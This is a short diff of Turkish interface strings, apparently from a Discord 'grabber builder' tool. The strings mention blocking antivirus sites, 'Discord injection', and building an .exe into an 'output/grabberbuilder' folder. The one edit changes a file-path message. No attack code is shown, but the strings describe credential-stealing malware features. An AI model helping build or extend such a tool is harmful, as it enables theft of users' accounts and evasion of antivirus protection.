@@ -253,7 +253,7 @@ Av Sitesini Engelle (E/H)
 Discord Enjeksiyonu (E/H)
 Dosya İkonu
 {isim}.exe oluşturuluyor, Bu birkaç saniye sürebilir. Sabrınız için teşekkürler!
-Dosya 'output/grabberbuilder/{isim}.exe konumuna alındı.
+Dosya {path} konumuna alındı.
 Grup sohbeti oluşturuldu
 Sınırlandırılmış oran ({response.json()['retry_after']}ms)
 Rastgele seçim için yeterli arkadaş yok
